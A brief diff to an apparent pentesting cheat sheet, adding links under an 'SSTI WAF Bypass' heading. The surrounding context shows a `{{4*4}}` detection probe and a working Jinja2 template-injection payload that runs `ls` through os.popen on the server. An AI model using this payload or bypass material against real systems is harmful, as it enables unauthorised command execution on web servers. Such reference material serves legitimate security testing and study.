@@ -529,6 +529,11 @@ Check for `{{4*4}}` on the url `http://IP/{{4*4}}` if it returns "16" as a resul
 **Exploit**<br/>
 `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
 
+### SSTI WAF Bypass
+
+- https://chowdera.com/2020/12/20201221231521371q.html
+- https://www.fatalerrors.org/a/0dhx1Dk.html
+- https://hackmd.io/@Chivato/HyWsJ31dI
 
 
 ### XSS Session Hijacking
